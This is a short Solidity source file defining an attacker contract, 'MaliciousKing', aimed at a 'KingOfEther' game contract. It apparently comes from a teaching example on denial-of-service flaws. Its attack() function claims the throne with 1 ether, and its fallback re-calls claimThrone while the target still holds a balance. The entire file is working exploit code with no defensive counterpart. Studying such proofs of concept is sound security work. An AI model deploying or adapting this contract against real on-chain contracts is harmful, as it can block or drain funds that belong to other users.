// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./DOS.sol";

contract MaliciousKing {
    KingOfEther public kingOfEther;

    constructor(address _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    fallback() external payable {
        if (address(kingOfEther).balance > 0) {
            kingOfEther.claimThrone{value: 1 ether}();
        }
    }

    function attack() public payable {
        kingOfEther.claimThrone{value: 1 ether}();
    }
}